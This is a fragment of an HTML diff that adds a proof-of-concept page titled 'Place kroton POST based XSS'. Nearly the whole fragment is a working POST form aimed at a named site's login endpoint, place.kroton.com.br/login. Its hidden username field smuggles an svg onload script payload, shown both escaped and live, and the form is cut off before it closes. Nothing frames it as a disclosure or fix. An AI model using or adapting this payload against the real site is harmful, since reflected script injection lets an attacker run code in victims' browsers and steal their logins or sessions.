@@ -2,6 +2,8 @@
  
   <body>
   <script>history.pushState('', '', '/')</script>
+   Place kroton POST based XSS - CODE
+<p>&lt;form action="https://place.kroton.com.br/login" method="POST"&gt;<br /> &lt;input type="hidden" name="usuario" value="haxi&amp;quot;&amp;gt;&amp;lt;svg&amp;#47;onload&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;" /&gt;<br /> &lt;input type="hidden" name="senha" value="a" /&gt;<br /> &lt;input type="submit" value="Submit request" /&gt;<br /> &lt;/form&gt;</p>
     <form action="https://place.kroton.com.br/login" method="POST">
       <input type="hidden" name="usuario" value="haxi&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;&#41;&gt;" />
       <input type="hidden" name="senha" value="a" />
